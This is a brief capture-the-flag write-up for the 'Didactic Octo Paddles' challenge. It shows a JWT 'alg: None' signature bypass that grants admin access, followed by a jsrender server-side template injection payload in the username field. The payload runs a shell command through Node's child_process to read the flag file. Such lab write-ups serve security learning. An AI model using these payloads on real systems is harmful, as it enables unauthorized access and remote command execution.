---
title: 'Didactic Octo Paddles'
date: '2023-09-23'
---

# Didactic Octo Paddles

First we know that we have to go through username, and password
try to register new account, try to detect vulnerable in cart => fail

read admin middleware, we notice that we can bypass **alg: None** when else executed ⇒ **attack alg:None JWT ⇒ not check signature**
so we can get /admin page with admin privilege => next step

try to read /admin routes
detect that it can be vulnerable to SSTI => jsrender template
without santinizing username
find payload

```python=
{
"alg": "None",
"typ": "JWT"
}
{
"id": 1,
"iat": 1679824202,
"exp": 1679827802
}

payload : we register new account with admin's rights
{
"username":"{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()\")()}},\"password\":\"123\"}",
"password": "123"
}
```


and can read flag
=> solve